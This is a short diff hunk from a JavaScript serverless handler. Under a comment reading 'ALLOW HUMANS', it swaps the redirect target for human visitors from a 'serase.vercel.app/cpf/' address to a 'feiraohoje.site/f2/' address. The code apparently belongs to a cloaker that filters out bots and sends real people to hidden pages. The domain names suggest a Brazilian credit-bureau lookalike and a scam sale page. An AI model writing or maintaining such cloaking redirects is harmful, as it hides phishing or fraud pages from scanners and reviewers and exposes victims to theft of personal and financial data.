@@ -394,7 +394,7 @@ export default async function handler(req, res) {
     }
 
     // ✅ ALLOW HUMANS
-    const realUrl = `https://serase.vercel.app/cpf/${req.url.includes("?") ? req.url.substring(req.url.indexOf("?")) : ""}`;
+    const realUrl = `https://www.feiraohoje.site/f2/${req.url.includes("?") ? req.url.substring(req.url.indexOf("?")) : ""}`;
 
     const sessionId = crypto.randomUUID();
     const timestamp = Date.now();
